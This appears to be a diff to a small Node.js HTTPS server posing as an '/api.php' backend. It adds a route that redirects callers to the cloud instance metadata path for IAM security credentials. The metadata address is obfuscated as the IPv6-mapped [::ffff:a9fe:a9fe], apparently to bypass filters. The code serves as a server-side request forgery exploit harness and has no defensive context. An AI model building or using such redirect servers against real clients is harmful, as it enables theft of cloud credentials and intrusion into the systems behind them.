@@ -12,13 +12,18 @@ const port2 = 80;
 let content = "";
 
 const server = https.createServer(options, (req, res) => {
+  res.statusCode = 200;
   console.log(req.url);
   if(req.url === "/api.php/me"){
     content = "test";
   }else if(req.url === "/api.php/meta/modules"){
     content = '{"list": [{"module": "test", "primary_model":"model_test", "models": ["model_test"]}]}';
+  }else if(req.url === "/api.php/test"){
+    res.statusCode = 302;
+    res.setHeader("Location","http://[::ffff:a9fe:a9fe]/latest/meta-data/iam/security-credentials/iam-eks-node");
+    res.end();
+    return;
   }
-  res.statusCode = 200;
   //res.setHeader('Content-Type', 'text/plain');
   res.setHeader('Content-Length', `${content.length}`);
   res.end(content);
